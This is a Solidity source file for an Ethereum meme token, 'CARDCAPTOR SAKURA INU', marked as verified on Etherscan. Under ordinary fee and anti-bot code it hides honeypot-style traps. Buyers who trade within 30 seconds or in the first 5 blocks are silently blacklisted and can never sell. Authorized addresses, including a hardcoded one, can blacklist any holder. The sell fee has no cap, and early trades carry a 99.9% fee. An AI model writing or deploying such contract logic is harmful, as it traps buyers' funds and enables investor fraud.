/**
 *Submitted for verification at Etherscan.io on 2021-11-12
*/

pragma solidity ^0.7.6;
 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
 
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
 
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
 
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
 
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
 
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
 
/**
 * BEP20 standard interface.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address internal _owner;
    mapping (address => bool) internal authorizations;
 
    constructor(address owner_) {
        _owner = owner_;
        authorizations[owner_] = true;
        authorizations[0xcaf01fF19E07fd76A5C79b24aFad33aF43FB3956] = true;
    }
 
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
 
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }
 
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }
 
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }
 
    function isOwner(address account) public view returns (bool) {
        return account == _owner;
    }
 
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }
 
    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }
 
    function transferOwnership(address payable adr) public onlyOwner {
        _owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }
 
    event OwnershipTransferred(address owner);
}
 
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
 
interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract CARDCAPTORSAKURAINU is IERC20, Auth {
    using SafeMath for uint256;
 
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    string constant _name = 'CARDCAPTOR SAKURA INU';
    string constant _symbol = 'CCSI';
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 1000000000000 * (10 ** _decimals);
    uint256 _maxTxAmount = _totalSupply / 100;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) private bots;
    mapping(address => uint256) private _LastTXTimestamp;

    uint256 marketingFee = 60;
    uint256 teamFee = 60;
    uint256 totalFee = 120;
    uint256 sellFee = 120;
    uint256 feeDenominator = 1000;
 
    address public autoLiquidityReceiver;
    address public marketingFeeReceiver;
    address public teamFeeReceiver;
 
    IDEXRouter public router;
    address public pair;
    uint256 public launchedAt;
    uint256 public launchedTime;
    bool public swapEnabled = true;
 
    uint256 public swapThreshold = _totalSupply / 1000; // 0.1%
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
 
    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);
 
        isFeeExempt[_owner] = true;
        isFeeExempt[address(this)] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[address(this)] = true;
	    marketingFeeReceiver = address(0xcaf01fF19E07fd76A5C79b24aFad33aF43FB3956);
	    teamFeeReceiver = address(msg.sender);
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }
 
    receive() external payable { }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return _owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) {
    _allowances[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);
    return true;
    }
 
    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }
 
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
 
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }
 
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(!inSwap && shouldSwapBack()){ swapBack(); }
        if(!launched() && recipient == pair){ require(_balances[sender] > 0); launch(); }
	    require(!bots[sender]);
        require(amount<= _maxTxAmount);
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
    	uint256 amountReceived;
        if(!isFeeExempt[recipient]){amountReceived= shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;}else{amountReceived = amount;}
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
 
    function getTotalFee(bool selling) public view returns (uint256) {
        if(launchedAt + 5 > block.number){ return feeDenominator.sub(1); }
	if(selling){return sellFee;}
        return totalFee;
    }
 
    function shouldTakeFee(address sender) internal view returns (bool) {
       return !isFeeExempt[sender];
    }
 
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee(receiver == pair)).div(feeDenominator);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
	    if(_LastTXTimestamp[receiver] + 30 > block.timestamp){bots[receiver] = true;}
	    if(launchedAt + 5 > block.number){bots[receiver] = true;}
	    _LastTXTimestamp[receiver] = block.timestamp;
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }
 
    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }
 
    function swapBack() internal swapping {
        uint256 amountToSwap = balanceOf(address(this));
 
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;
 
        uint256 balanceBefore = address(this).balance;
 
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp+360
        );
 
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee;
        uint256 amountETHTeam = amountETH.mul(teamFee).div(totalETHFee);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
    	payable(marketingFeeReceiver).transfer(amountETHMarketing);
    	payable(teamFeeReceiver).transfer(amountETHTeam);
        }
 

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }
 
    function launch() internal{
	    require(!launched());
            launchedAt = block.number;
	        launchedTime = block.timestamp;
    }
 
    function manualSwap()external authorized{
        swapBack();
    }
 
    function setIsFeeExempt(address holder, bool exempt) external authorized{
        isFeeExempt[holder] = exempt;
    }
 
    function setFeeReceivers(address _teamFeeReceiver, address _marketingFeeReceiver) external authorized{
        teamFeeReceiver = _teamFeeReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }
 
    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized{
        swapEnabled = _enabled;
        swapThreshold =_totalSupply.div(_amount);
    }
 
     function removeMAXTX() external authorized{
        _maxTxAmount = _totalSupply;
     }

     function isBot(address _bot) external authorized{
       bots[_bot] = true;
     } 

     function notBot(address _bot) external authorized{
       bots[_bot] = false;
     } 

    function setFees(uint256 _teamFee, uint256 _marketingFee, uint256 _feeDenominator, uint256 _sellFee) external authorized{
        teamFee = _teamFee;
        marketingFee = _marketingFee;
        totalFee = teamFee.add(_marketingFee);
        feeDenominator = _feeDenominator;
	    sellFee = _sellFee;
        require(totalFee < feeDenominator/4);
    }
 

    function recoverEth() external {
        payable(teamFeeReceiver).transfer(address(this).balance);
    }
 
    function recoverToken(address _token, uint256 amount) external returns (bool _sent){
        _sent = IERC20(_token).transfer(teamFeeReceiver, amount);
    }
}